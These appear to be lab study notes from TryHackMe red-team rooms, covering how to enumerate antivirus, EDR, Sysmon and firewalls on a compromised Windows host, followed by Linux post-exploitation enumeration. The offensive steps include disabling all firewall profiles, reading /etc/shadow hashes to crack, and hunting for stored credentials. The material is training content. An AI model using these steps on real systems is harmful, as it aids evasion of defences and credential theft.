3. Host-based Firewall
4. Security Event Logging and Monitoring
5. Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS)
6. Endpoint Detection and Response (EDR)

Let's go more detail through the host-based security solutions that we may encounter during the red team engagement.

# Antivirus Software ()

Antivirus
 software also known as anti-malware, is mainly used to monitor, detect,
 and prevent malicious software from being executed within the host.  Most
 antivirus software applications use well-known features, including 
Background scanning, Full system scans, Virus definitions. In the 
background scanning, the antivirus software works in real-time and scans
 all open and used files in the background. The full system scan is 
essential when you first install the antivirus. The most interesting 
part is the virus definitions, where antivirus software replies to the 
pre-defined virus. That's why antivirus software needs to update from 
time to time.

There are various detection techniques that the antivirus uses, including

- Signature-based detection
- Heuristic-based detection
- Behavior-based detection

**Signature-based detection** is
 one of the common and traditional techniques used in antivirus software
 to identify malicious files. Often, researchers or users submit their 
infected files into an antivirus engine platform for further analysis by
 AV vendors, and if it confirms as malicious, then the signature gets registered in their database. The antivirus software compares
 the scanned file with a database of known signatures for possible 
attacks and malware on the client-side. If we have a match, then it 
considers a threat.

**Heuristic-based detection** uses
 machine learning to decide whether we have the malicious file or not. 
It scans and statically analyses in real-time in order to find 
suspicious properties in the application's code or check whether it uses
 uncommon Windows or system APIs. It does not rely on the 
signature-based attack in making the decisions, or sometimes it does. 
This depends on the implementation of the antivirus software.

Finally, **Behavior-based detection** relies
 on monitoring and examining the execution of applications to find 
abnormal behaviors and uncommon activities, such as creating/updating 
values in registry keys, killing/creating processes, etc.

As a red teamer, it is essential to be aware of whether 
antivirus exists or not. It prevents us from doing what we are 
attempting to do. We can enumerate AV software using Windows built-in tools, such as wmic.

PowerShell

```
PS C:\Users\thm> wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

This also can be done using PowerShell, which gives the same result.

PowerShell

```
PS C:\Users\thm> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

displayName              : Bitdefender Antivirus
instanceGuid             : {BAF124F4-FA00-8560-3FDE-6C380446AEFB}
pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe
pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
productState             : 266240
timestamp                : Wed, 15 Dec 2021 12:40:10 GMT
PSComputerName           :

displayName              : Windows Defender
instanceGuid             : {D58FFC3A-813B-4fae-9E44-DA132C9FAA36}
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
productState             : 393472
timestamp                : Fri, 15 Oct 2021 22:32:01 GMT
PSComputerName           :
```

As a result, there is a third-party antivirus (Bitdefender Antivirus) and Windows Defender installed on the computer. **Note** that Windows servers may not have SecurityCenter2 namespace, which may not work on the attached VM. Instead, it works for Windows workstations!

# Microsoft Windows Defender

Microsoft
 Windows Defender is a pre-installed antivirus security tool that runs 
on endpoints. It uses various algorithms in the detection, including 
machine learning, big-data analysis, in-depth threat resistance 
research, and Microsoft cloud infrastructure in protection against 
malware and viruses. MS Defender works in three protection modes: 
Active, Passive, Disable modes.

**Active**
 mode is used where the MS Defender runs as the primary antivirus 
software on the machine where provides protection and remediation. **Passive** mode
 is run when a 3rd party antivirus software is installed. Therefore, it 
works as secondary antivirus software where it scans files and detects 
threats but does not provide remediation. Finally, **Disable** mode is when the MS Defender is disabled or uninstalled from the system.

We can use the following PowerShell command to check the service state of Windows Defender:

PowerShell

```
PS C:\Users\thm> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Antivirus Service
```

Next, we can start using the Get-MpComputerStatus cmdlet to get the current Windows Defender status. However, it provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc. We can use select to specify what we need for as follows,

PowerShell

```
PS C:\Users\thm> Get-MpComputerStatus | select RealTimeProtectionEnabled

RealTimeProtectionEnabled
-------------------------
                    False
```

As a result, MpComputerStatus highlights whether Windows Defender is enabled or not.

3. Host-based Firewall:
 It is a security tool installed and run on a host machine that can 
prevent and block attacker or red teamers' attack attempts. Thus, it is 
essential to enumerate and gather details about the firewall and its 
rules within the machine we have initial access to.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/397c848fb415b72ce235915dea420900.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/397c848fb415b72ce235915dea420900.png)

The main purpose of the host-based firewall is to control the inbound
 and outbound traffic that goes through the device's interface. It 
protects the host from untrusted devices that are on the same network. A
 modern host-based firewall uses multiple levels of analyzing traffic, 
including packet analysis, while establishing the connection.

A 
firewall acts as control access at the network layer. It is capable of 
allowing and denying network packets. For example, a firewall can be 
configured to block ICMP packets sent through the ping command
 from other machines in the same network. Next-generation firewalls also
 can inspect other OSI layers, such as application layers. Therefore, it
 can detect and block SQL injection and other application-layer attacks.

PowerShell

```
PS C:\Users\thm> Get-NetFirewallProfile | Format-Table Name, Enabled

Name    Enabled
----    -------
Domain     True
Private    True
Public     True
```

If we have admin privileges on the current 
user we logged in with, then we try to disable one or more than one 
firewall profile using the Set-NetFirewallProfile cmdlet.

PowerShell

```
PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
PS C:\Windows\system32> Get-NetFirewallProfile | Format-Table Name, Enabled
---- -------
Domain False
Private False
Public False
```

We can also learn and check the current

Firewall

rules, whether allowing or denying by the firewall.

PowerShell

```
PS C:\Users\thm> Get-NetFirewallRule | select DisplayName, Enabled, Description

DisplayName                                                                  Enabled
-----------                                                                  -------
Virtual Machine Monitoring (DCOM-In)                                           False
Virtual Machine Monitoring (Echo Request - ICMPv4-In)                          False
Virtual Machine Monitoring (Echo Request - ICMPv6-In)                          False
Virtual Machine Monitoring (NB-Session-In)                                     False
Virtual Machine Monitoring (RPC)                                               False
SNMP Trap Service (UDP In)                                                     False
SNMP Trap Service (UDP In)                                                     False
Connected User Experiences and Telemetry                                        True
Delivery Optimization (TCP-In)                                                  True
```

During the red team engagement, we have no clue what the firewall blocks. However, we can take advantage of some PowerShell cmdlets such as Test-NetConnection and TcpClient.
 Assume we know that a firewall is in place, and we need to test inbound
 connection without extra tools, then we can do the following:

PowerShell

```
PS C:\Users\thm> Test-NetConnection -ComputerName 127.0.0.1 -Port 80

ComputerName     : 127.0.0.1
RemoteAddress    : 127.0.0.1
RemotePort       : 80
InterfaceAlias   : Loopback Pseudo-Interface 1
SourceAddress    : 127.0.0.1
TcpTestSucceeded : True

PS C:\Users\thm> (New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected
True
```

As a result, we can confirm the inbound connection on port 80 is open
 and allowed in the firewall. Note that we can also test for remote 
targets in the same network or domain names by specifying in the -ComputerName argument for the Test-NetConnection.

**Host Security Solution #2**

In this task, we will keep discussing host security solutions.

# Security Event Logging and Monitoring

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/980c1573a3ec3d309d0f2360c16b019a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/980c1573a3ec3d309d0f2360c16b019a.png)

By
 default, Operating systems log various activity events in the system 
using log files. The event logging feature is available to the IT system
 and network administrators to monitor and analyze important events, 
whether on the host or the network side. In cooperating networks, 
security teams utilize the logging event technique to track and 
investigate security incidents.

There are various categories 
where the Windows operating system logs event information, including the
 application, system, security, services, etc. In addition, security and
 network devices store event information into log files to allow the 
system administrators to get an insight into what is going on.

We can get a list of available event logs on the local machine using the Get-EventLog cmdlet.

PowerShell

```
PS C:\Users\thm> Get-EventLog -List

  Max(K) Retain OverflowAction        Entries Log
  ------ ------ --------------        ------- ---
     512      7 OverwriteOlder             59 Active Directory Web Services
  20,480      0 OverwriteAsNeeded         512 Application
     512      0 OverwriteAsNeeded         170 Directory Service
 102,400      0 OverwriteAsNeeded          67 DNS Server
  20,480      0 OverwriteAsNeeded       4,345 System
  15,360      0 OverwriteAsNeeded       1,692 Windows PowerShell
```

Sometimes, the list of available event logs gives you 
an insight into what applications and services are installed on the 
machine! For example, we can see that the local machine has Active 
Directory, DNS server, etc. For more information about the Get-EventLog cmdlet with examples, visit the [Microsoft documents website](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1).

In
 corporate networks, log agent software is installed on clients to 
collect and gather logs from different sensors to analyze and monitor 
activities within the network. We will discuss them more in the Network 
Security Solution task.

# System Monitor ()

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c77acd6d831c3b9f4c5b5f0cdc0d08c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c77acd6d831c3b9f4c5b5f0cdc0d08c.png)

Windows System Monitor sysmon is a service and device driver. It is one of the Microsoft Sysinternals suites. The sysmon tool
 is not an essential tool (not installed by default), but it starts 
gathering and logging events once installed. These logs indicators can 
significantly help system administrators and blue teamers to track and 
investigate malicious activity and help with general troubleshooting.

One of the great features of the sysmon  tool is that it can log many important events, and you can also create your own rule(s) and configuration to monitor:

- Process creation and termination
- Network connections
- Modification on file
- Remote threats
- Process and memory access
- and many others

For learning more about sysmon, visit the Windows document page [here](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).

As
 a red teamer, one of the primary goals is to stay undetectable, so it 
is essential to be aware of these tools and avoid causing generating and
 alerting events. The following are some of the tricks that can be used 
to detect whether the sysmon is available in the victim machine or not.

We can look for a process or service that has been named "Sysmon" within the current process or services as follows,

PowerShell

```
PS C:\Users\thm> Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    373      15    20212      31716              3316   0 Sysmon
```

or look for services as follows,

PowerShell

```
PS C:\Users\thm> Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
# orGet-Service | where-object {$_.DisplayName -like "*sysm*"}
```

It also can be done by checking the Windows registry

PowerShell

```
PS C:\Users\thm> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

All these commands confirm if the sysmon tool
 is installed. Once we detect it, we can try to find the sysmon 
configuration file if we have readable permission to understand what 
system administrators are monitoring.

PowerShell

```
PS C:\Users\thm> findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
C:\tools\Sysmon\sysmonconfig.xml:
C:\tools\Sysmon\sysmonconfig.xml:
```

For more detail about the Windows sysmon tool and how to utilize it within endpoints, we suggest trying the TryHackMe room: [Sysmon](https://tryhackme.com/room/sysmon).

# Host-based Intrusion Detection/Prevention System (HIDS/HIPS)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/933d57959af6b3ac9396e688698bb358.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/933d57959af6b3ac9396e688698bb358.png)

**HIDS** stands
 for Host-based Intrusion Detection System. It is software that has the 
ability to monitor and detect abnormal and malicious activities in a 
host. The primary purpose of HIDS
 is to detect suspicious activities and not to prevent them. There are 
two methods that the host-based or network intrusion detection system 
works, including:

- Signature-based IDS - it looks at checksums and message authentication.
- Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports.

Host-based Intrusion Prevention Systems (**HIPS**)
 secure the operating system activities of the device where they are 
installed. It is a detection and prevention solution against well-known 
attacks and abnormal behaviours. HIPS
 can audit the host's log files, monitor processes, and protect system 
resources. HIPS combines many product features such as antivirus, 
behaviour analysis, network, application firewall, etc.

There is also a network-based IDS/IPS, which we will be covering in the next task.

# Endpoint Detection and Response ()

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92a60622a80d64cc6dbedaa6c207662b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92a60622a80d64cc6dbedaa6c207662b.png)

It is also known as Endpoint Detection and Threat Response (EDTR). The EDR
 is a cybersecurity solution that defends against malware and other 
threats. EDRs can look for malicious files, monitor endpoint, system, 
and network events, and record them in a database for further analysis, 
detection, and investigation. EDRs are the next generation of antivirus 
and detect malicious activities on the host in real-time.

EDR analyze system data and behavior for making section threats, including

- Malware, including viruses, trojans, adware, keyloggers
- Exploit chains
- Ransomware

Below are some common EDR software for endpoints

- Cylance
- Crowdstrike
- Symantec
- SentinelOne
- Many others

Even though an attacker successfully delivered their payload and bypassed EDR
 in receiving reverse shell, EDR is still running and monitors the 
system. It may block us from doing something else if it flags an alert.

We can use scripts for enumerating security products within the machine, such as [Invoke-EDRChecker](https://github.com/PwnDexter/Invoke-EDRChecker) and [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker). They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories.

**Network Security Solutions**

This task will discuss network security solutions commonly seen and used in enterprises networks.

# Network Security Solutions

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e11f81fc50e049855849e20d7f34e453.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e11f81fc50e049855849e20d7f34e453.png)

Network
 security solutions could be software or hardware appliances used to 
monitor, detect and prevent malicious activities within the network. It 
focuses on protecting clients and devices connected to the cooperation 
network. The network security solution includes but is not limited to:

- Network Firewall
- SIEM
- IDS/IPS

# Network

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e4a1c6568d8f21c9f0fb0ea8c193a880.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e4a1c6568d8f21c9f0fb0ea8c193a880.png)

A
 firewall is the first checkpoint for untrusted traffic that arrives at a
 network. The firewall filters the untrusted traffic before passing it 
into the network based on rules and policies. In addition, Firewalls can
 be used to separate networks from external traffic sources, internal 
traffic sources, or even specific applications. Nowadays,
 firewall products are built-in network routers or other security 
products that provide various security features. The following are some 
firewall types that enterprises may use.

- Packet-filtering firewalls
- Proxy firewalls
- NAT firewalls
- Web application firewalls

# Security Information and Event Management ()

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/4a5624e396e6075fc18eae92f9d3d84e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/4a5624e396e6075fc18eae92f9d3d84e.png)

SIEM
 combines Security Information Management (SIM) and Security Event 
Management (SEM) to monitor and analyze events and track and log data in
 real-time. SIEM helps system administrators and blue teamers to monitor
 and track potential security threats and vulnerabilities before causing
 damage to an organization.

SIEM
 solutions work as log data aggregation center, where it collects log 
files from sensors and perform functions on the gathered data to 
identify and detect security threats or attacks. The following are some 
of the functions that a SIEM may offer:

- Log management: It captures and gathers data for the entire enterprise network in real-time.
- Event analytics: It applies advanced analytics to detect abnormal patterns or behaviors, available in the dashboard with charts and statistics.
- Incident monitoring and security alerts: It monitors the entire network,
including connected users, devices, applications, etcetera, and as soon
as attacks are detected, it alerts administrators immediately to take
appropriate action to mitigate.
- Compliance management and reporting: It generates real-time reports at any time.

SIEM
 is capable of detecting advanced and unknown threats using integrated 
threat intelligence and AI technologies, including Insider threats, 
security vulnerabilities, phishing attacks, Web attacks, DDoS attacks, 
data exfiltration, etc.

The following are some of the SIEM products that are commonly seen in many enterprises:

- Splunk
- LogRhythm NextGen SIEM Platform
- SolarWinds Security Event Manager
- Datadog Security Monitoring
- many others

# Intrusion Detection System and Intrusion Prevention System (NIDS/NIPS)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/4158d8d7b3d4e71f725fbc876e4a6ca8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/4158d8d7b3d4e71f725fbc876e4a6ca8.png)

Network-based IDS/IPS
 have a similar concept to the host-based IDS/IPS. The main difference 
is that the network-based products focus on the security of a network 
instead of a host. The network-based solution will be based on sensors 
and agents distributed in the network devices and hosts to collect data.
 IDS and IPS are both detection and monitoring cybersecurity solutions 
that an enterprise uses to secure its internal systems. They both read 
network packets looking for abnormal behaviors and known threats 
pre-loaded into a previous database. The significant difference between 
both solutions is that the IDS requires human interaction or 3rd party 
software to analyze the data to take action. The IPS is a control system
 that accepts or rejects packets based on policies and rules.

The following are common enterprise IDS/IPS products

- Palo Alto Networks
- Cisco's Next-Generation
- McAfee Network Security Platform (NSP)
- Trend Micro TippingPoint
- Suricata

For more information about IDS/IPS, visit the reference [link](https://geekflare.com/ids-vs-ips-network-security-solutions/).

**Applications and Services**

This task will expand 
our knowledge needed to learn more about the system. We discussed 
account discovery and security products within the system in previous 
tasks.   We will continue learning more about the system, including:

- Installed applications
- Services and processes
- Sharing files and printers
- Internal services: DNS and local web applications

It is necessary to understand what the system provides in order to get the benefit of the information.

# Installed Applications

First,
 we start enumerating the system for installed applications by checking 
the application's name and version. As a red teamer, this information 
will benefit us. We may find vulnerable software installed to exploit 
and escalate our system privileges. Also, we may find some information, 
such as plain-text credentials, is left on the system that belongs to 
other systems or services.

We will be using the wmic Windows command to list all installed applications and their version.

PowerShell

```
PS C:\Users\thm> wmic product get name,version
Name                                                            Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     14.28.29910
AWS Tools for Windows                                           3.15.1248
Amazon SSM Agent                                                3.0.529.0
aws-cfn-bootstrap                                               2.0.5
AWS PV Drivers                                                  8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  14.28.29910
```

Another interesting thing is to look for particular text strings, hidden directories, backup files. Then we can use the PowerShell cmdlets, Get-ChildItem, as follow:

PowerShell

```
PS C:\Users\thm> Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
```

# Services and Process

Windows
 services enable the system administrator to create long-running 
executable applications in our own Windows sessions. Sometimes Windows 
services have misconfiguration permissions, which escalates the current 
user access level of permissions. Therefore, we must look at running 
services and perform services and processes reconnaissance.  For more 
details, you can read about process discovery on [Attack MITRE](https://attack.mitre.org/techniques/T1057/).

Process
 discovery is an enumeration step to understand what the system 
provides. The red team should get information and details about running 
services and processes on a system. We need to understand as much as 
possible about our targets. This information could help us understand 
common software running on other systems in the network. For example, the compromised system may have a custom client application used for internal purposes. Custom internally developed software is the most common root cause of escalation vectors. Thus, it is worth digging more to get details about the current process.

For more details about core Windows processes from the blue team perspective, check out the TryHackMe room: [Core Windows Process](https://tryhackme.com/room/btwindowsinternals).

# Sharing files and Printers

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/3ff0f1652898c0985f220d47a2feb1c1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/3ff0f1652898c0985f220d47a2feb1c1.png)

Sharing
 files and network resources is commonly used in personal and enterprise
 environments. System administrators misconfigure access permissions, 
and they may have useful information about other accounts and systems. 
For more information on printer hacking, we suggest trying out the 
following TryHackMe room: [Printer Hacking 101](https://tryhackme.com/room/printerhacking101).

# Internal services: , local web applications, etc

Internal
 network services are another source of information to expand our 
knowledge about other systems and the entire environment. To get more 
details about network services that are used for external and internal 
network services, we suggest trying out the following rooms: [Network Service](https://tryhackme.com/room/networkservices), [Network Service2](https://tryhackme.com/room/networkservices2).

The following are some of the internal services that are commonly used that we are interested in:

- DNS Services
- Email Services
- Network File Share
- Web application
- Database service

### **ENUMERATION**

**Introduction**

This room focuses on 
post-exploitation enumeration. In other words, we assume that we have 
successfully gained some form of access to a system. Moreover, we may 
have carried out privilege escalation; in other words, we might have 
administrator or root privileges on the target system. Some of the 
techniques and tools discussed in this room would still provide helpful 
output even with an unprivileged account, i.e., not root or 
administrator.

If you are interested in privilege escalation, you can check the [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) room and the [Linux PrivEsc](https://tryhackme.com/room/linprivesc) room. Moreover, there are two handy scripts, [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [LinPEAS](https://grimbins.github.io/grimbins/linpeas/) for MS Windows and Linux privilege escalation respectively.

Our purpose is to collect more information that will aid us in 
gaining more access to the target network. For example, we might find 
the login credentials to grant access to another system. We focus on 
tools commonly available on standard systems to collect more information
 about the target. Being part of the system, such tools look innocuous 
and cause the least amount of "noise".

We assume you have access to a command-line interface on the target, such as `bash` on a Linux system or `cmd.exe` on an MS Windows system. Starting with one type of shell on a Linux system, it is usually easy to switch to another one. Similarly, starting from `cmd.exe`, you can switch to PowerShell if available. We just issued the command `powershell.exe` to start the PowerShell interactive command line in the terminal below.

Terminal

```
user@TryHackMe$ Microsoft Windows [Version 10.0.17763.2928](c) 2018 Microsoft Corporation. All rights reserved.

strategos@RED-WIN-ENUM C:\Users\strategos>powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\strategos>
```

This room is organized as follows:

- Purpose of enumeration
- Linux enumeration with commonly-installed tools: System, users, networking, and running services
- MS Windows enumeration with built-in tools: System, users, networking, and running services
- Examples of additional tools: Seatbelt

**Purpose**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/51cfb2e8bf86ff49d820dd45b78ad26c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/51cfb2e8bf86ff49d820dd45b78ad26c.png)

When you gain a “shell” 
on the target system, you usually have very basic knowledge of the 
system. If it is a server, you already know which service you have 
exploited; however, you don’t necessarily know other details, such as 
usernames or network shares. Consequently, the shell will look like a 
“dark room” where you have an incomplete and vague knowledge of what’s 
around you. In this sense, enumeration helps you build a more complete 
and accurate picture.

The purpose behind post-exploitation enumeration is to gather as much
 information about the system and its network. The exploited system 
might be a company desktop/laptop or a server. We aim to collect the 
information that would allow us to pivot to other systems on the network
 or to loot the current system. Some of the information we are 
interested in gathering include:

- Users and groups
- Hostnames
- Routing tables
- Network shares
- Network services
- Applications and banners
- Firewall configurations
- Service settings and audit configurations
- SNMP and DNS details
- Hunting for credentials (saved on web browsers or client applications)

There is no way to list everything we might stumble upon. For instance, we might find SSH
 keys that might grant us access to other systems. In SSH key-based 
authentication, we generate an SSH key pair (public and private keys); 
the public key is installed on a server. Consequently, the server would 
trust any system that can prove knowledge of the related private key.

Furthermore, we might stumble upon sensitive data saved among the 
user’s documents or desktop directories. Think that someone might keep a
 `passwords.txt` or `passwords.xlsx` instead of a 
proper password manager. Source code might also contain keys and 
passwords left lurking around, especially if the source code is not 
intended to be made public.

**Linux Enumeration**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/bccf63d717b423189ffff7ec926c408e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/bccf63d717b423189ffff7ec926c408e.png)

This task focuses on enumerating a Linux machine after accessing a shell, such as `bash`.
 Although some commands provide information on more than one area, we 
tried to group the commands into four categories depending on the 
information we expect to acquire.

- System
- Users
- Networking
- Running Services

We recommend that you click "**Start AttackBox**" and "**Start Machine**" so that you can experiment and answer the questions at the end of this task.

### System

On a Linux
 system, we can get more information about the Linux distribution and 
release version by searching for files or links that end with `-release` in `/etc/`. Running `ls /etc/*-release` helps us find such files. Let’s see what things look like on a CentOS Linux.

Terminal

```
user@TryHackMe$ ls /etc/*-release/etc/centos-release  /etc/os-release  /etc/redhat-release  /etc/system-release
$ cat /etc/os-release NAME="CentOS Linux"
VERSION="7 (Core)"
[...]
```

Let’s try on a Fedora system.

Terminal

```
user@TryHackMe$ ls /etc/*-release/etc/fedora-release@  /etc/os-release@  /etc/redhat-release@  /etc/system-release@
$ cat /etc/os-releaseNAME="Fedora Linux"
VERSION="36 (Workstation Edition)"
[...]
```

We can find the system’s name using the command `hostname`.

Terminal

```
user@TryHackMe$ hostnamerpm-red-enum.thm
```

Various files on a system can provide plenty of useful information. In particular, consider the following `/etc/passwd`, `/etc/group`, and `/etc/shadow`. Any user can read the files `passwd` and `group`. However, the `shadow`
 password file requires root privileges as it contains the hashed 
passwords. If you manage to break the hashes, you will know the user’s 
original password.

Terminal

```
user@TryHackMe$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bash
[...]
michael:x:1001:1001::/home/michael:/bin/bash
peter:x:1002:1002::/home/peter:/bin/bash
jane:x:1003:1003::/home/jane:/bin/bash
randa:x:1004:1004::/home/randa:/bin/bash

$ cat /etc/grouproot:x:0:
[...]
michael:x:1001:
peter:x:1002:
jane:x:1003:
randa:x:1004:

$ sudo cat /etc/shadowroot:$6$pZlRFi09$qqgNBS.00qtcUF9x0yHetjJbXsw0PAwQabpCilmAB47ye3OzmmJVfV6DxBYyUoWBHtTXPU0kQEVUQfPtZPO3C.:19131:0:99999:7:::
[...]
michael:$6$GADCGz6m$g.ROJGcSX/910DEipiPjU6clo6Z6/uBZ9Fvg3IaqsVnMA.UZtebTgGHpRU4NZFXTffjKPvOAgPKbtb2nQrVU70:19130:0:99999:7:::
peter:$6$RN4fdNxf$wvgzdlrIVYBJjKe3s2eqlIQhvMrtwAWBsjuxL5xMVaIw4nL9pCshJlrMu2iyj/NAryBmItFbhYAVznqRcFWIz1:19130:0:99999:7:::
jane:$6$Ees6f7QM$TL8D8yFXVXtIOY9sKjMqJ7BoHK1EHEeqM5dojTaqO52V6CPiGq2W6XjljOGx/08rSo4QXsBtLUC3PmewpeZ/Q0:19130:0:99999:7:::
randa:$6$dYsVoPyy$WR43vaETwoWooZvR03AZGPPKxjrGQ4jTb0uAHDy2GqGEOZyXvrQNH10tGlLIHac7EZGV8hSIfuXP0SnwVmnZn0:19130:0:99999:7:::
```

Similarly, various directories can reveal information about users and
 might contain sensitive files; one is the mail directories found at `/var/mail/`.

Terminal

```
user@TryHackMe$ ls -lh /var/mail/total 4.0K
-rw-rw----. 1 jane      mail   0 May 18 14:15 jane
-rw-rw----. 1 michael   mail   0 May 18 14:13 michael
-rw-rw----. 1 peter     mail   0 May 18 14:14 peter
-rw-rw----. 1 randa     mail   0 May 18 14:15 randa
-rw-------. 1 root      mail 639 May 19 07:37 root
```

To find the installed applications you can consider listing the files in `/usr/bin/` and `/sbin/`:

- `ls -lh /usr/bin/`
- `ls -lh /sbin/`

On an RPM-based Linux system, you can get a list of all installed packages using `rpm -qa`. The `-qa` indicates that we want to *query all* packages.

On a Debian-based Linux system, you can get the list of installed packages using `dpkg -l`. The output below is obtained from an Ubuntu server.

Terminal

```
user@TryHackMe$ dpkg -lDesired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                            Architecture Description
+++-=====================================-==================================-============-===============================================================================
ii  accountsservice                       0.6.55-0ubuntu12~20.04.5           amd64        query and manipulate user account information
ii  adduser                               3.118ubuntu2                       all          add and remove users and groups
ii  alsa-topology-conf                    1.2.2-1                            all          ALSA topology configuration files
ii  alsa-ucm-conf                         1.2.2-1ubuntu0.13                  all          ALSA Use Case Manager configuration files
ii  amd64-microcode                       3.20191218.1ubuntu1                amd64        Processor microcode firmware for AMD CPUs
[...   ]
ii  zlib1g-dev:amd64                      1:1.2.11.dfsg-2ubuntu1.3           amd64        compression library - development
```

### Users

Files such as `/etc/passwd` reveal the usernames; however,
 various commands can provide more information and insights about other 
users on the system and their whereabouts.

You can show who is logged in using `who`.

Terminal

```
user@TryHackMe$ whoroot     tty1         2022-05-18 13:24
jane     pts/0        2022-05-19 07:17 (10.20.30.105)
peter    pts/1        2022-05-19 07:13 (10.20.30.113)
```

We can see that the user `root` is logged in to the system directly, while the users `jane` and `peter` are connected over the network, and we can see their IP addresses.

Note that `who` should not be confused with `whoami` which prints **your** effective user id.

Terminal

```
user@TryHackMe$ whoamijane
```

To take things to the next level, you can use `w`, which shows who is logged in and what they are doing. Based on the terminal output below, `peter` is editing `notes.txt` and `jane` is the one running `w` in this example.

Terminal

```
user@TryHackMe$ w 07:18:43 up 18:05,  3 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1                      Wed13   17:52m  0.00s  0.00s less -s
jane     pts/0    10.20.30.105     07:17    3.00s  0.01s  0.00s w
peter    pts/1    10.20.30.113     07:13    5:23   0.00s  0.00s vi notes.txt
```

To print the real and effective user and group IDS, you can issue the command `id` (for ID).

Terminal

```
user@TryHackMe$ iduid=1003(jane) gid=1003(jane) groups=1003(jane) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Do you want to know who has been using the system recently? `last`
 displays a listing of the last logged-in users; moreover, we can see 
who logged out and how much they stayed connected. In the output below, 
the user `randa` remained logged in for almost 17 hours, while the user `michael` logged out after four minutes.

Terminal

```
user@TryHackMe$ lastjane     pts/0        10.20.30.105     Thu May 19 07:17   still logged in
peter    pts/1        10.20.30.113     Thu May 19 07:13   still logged in
michael  pts/0        10.20.30.1       Thu May 19 05:12 - 05:17  (00:04)
randa    pts/1        10.20.30.107     Wed May 18 14:18 - 07:08  (16:49)
root     tty1                          Wed May 18 13:24   still logged in
[...]
```

Finally, it is worth mentioning that `sudo -l` lists the allowed command for the invoking user on the current system.

### Networking

The IP addresses can be shown using `ip address show` (which can be shortened to `ip a s`) or with the older command `ifconfig -a` (its package is no longer maintained.) The terminal output below shows the network interface `ens33` with the IP address `10.20.30.129` and subnet mask `255.255.255.0` as it is `24`.

Terminal

```
